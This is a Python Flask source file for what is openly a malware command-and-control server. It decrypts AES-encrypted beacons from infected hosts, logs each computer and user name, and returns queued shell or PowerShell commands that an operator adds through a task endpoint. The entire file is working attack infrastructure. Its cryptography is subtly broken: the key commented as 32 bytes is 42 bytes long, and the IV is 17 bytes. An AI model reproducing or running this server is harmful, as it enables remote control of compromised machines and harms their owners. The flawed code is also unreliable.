from flask import Flask, request, jsonify
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import base64, json

app = Flask(__name__)
AES_KEY = b"ChurchOfMalware2024!!ChurchOfMalware2024!!"  # 32 bytes
AES_IV = b"MalwareChurchIV!!"
task_queue = {}

def decrypt_aes(data_b64):
    ciphertext = base64.b64decode(data_b64)
    cipher = Cipher(algorithms.AES(AES_KEY), modes.CBC(AES_IV), backend=default_backend())
    decryptor = cipher.decryptor()
    plaintext = decryptor.update(ciphertext) + decryptor.finalize()
    pad_len = plaintext[-1]
    return plaintext[:-pad_len]

def encrypt_aes(plaintext):
    pad_len = 16 - (len(plaintext) % 16)
    plaintext += bytes([pad_len]) * pad_len
    cipher = Cipher(algorithms.AES(AES_KEY), modes.CBC(AES_IV), backend=default_backend())
    encryptor = cipher.encryptor()
    return base64.b64encode(encryptor.update(plaintext) + encryptor.finalize()).decode()

@app.route('/beacon', methods=['POST'])
def beacon():
    data = request.form.get('data')
    if not data: return "No data", 400
    decrypted = decrypt_aes(data)
    beacon_data = json.loads(decrypted.decode())
    print(f"[+] Beacon from {beacon_data['computer']}\\{beacon_data['user']}")
    
    host = beacon_data['computer']
    if host in task_queue and task_queue[host]:
        task = task_queue[host].pop(0)
        response = json.dumps({"task_id": task['id'], "command": task['cmd'], 
                               "args": task['args'], "is_powershell": task.get('ps', False)})
    else:
        response = json.dumps({"task_id": 0, "command": "", "args": ""})
    
    return encrypt_aes(response.encode()), 200

@app.route('/task', methods=['POST'])
def add_task():
    data = request.json
    host = data.get('host')
    if host not in task_queue: task_queue[host] = []
    task_queue[host].append({'id': len(task_queue[host]) + 1, 'cmd': data['command'], 
                             'args': data.get('args', ''), 'ps': data.get('powershell', False)})
    return jsonify({"status": "added"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=443, ssl_context='adhoc')
